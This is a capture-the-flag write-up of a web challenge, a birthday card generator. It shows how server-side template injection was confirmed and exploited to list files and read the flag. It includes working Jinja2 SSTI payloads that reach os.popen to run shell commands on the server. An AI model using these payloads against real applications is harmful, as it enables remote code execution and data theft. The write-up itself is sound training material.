Challenge: Happy Birthday Card Generator
Points: 100
Category: Web

![Alt text](screenshots/happybirthday1.png)

![Alt text](screenshots/happybirthday2.png)

First, let's try to see how it works. I enter "MD" as input and it gives the following result.

![Alt text](screenshots/happybirthday3.png)

Let's try to find out which server is it deployed on.

![Alt text](screenshots/happybirthday4.png)

As it's Werkzeug/1.0.1 Python/2.7.14, we can try Server-Side Template Injection (SSTI).
We input {{5*5}} and get 25 in the output.

![Alt text](screenshots/happybirthday5.png) 

As we have confirmation that SSTI is successful, we can try more sophisticated payloads.

Let's try to run "ls" to list files and directories using the following payload:
{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls /").read()}} [Payload Credits: https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part]

![Alt text](screenshots/happybirthday6.png)

We can see that flag.txt exists and we can get it's contents by using the following payload:
{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("cat /flag.txt").read()}} 

![Alt text](screenshots/happybirthday7.png)

FLAG: WHETSTONE{SsT1_is_v3ry_6Ad}

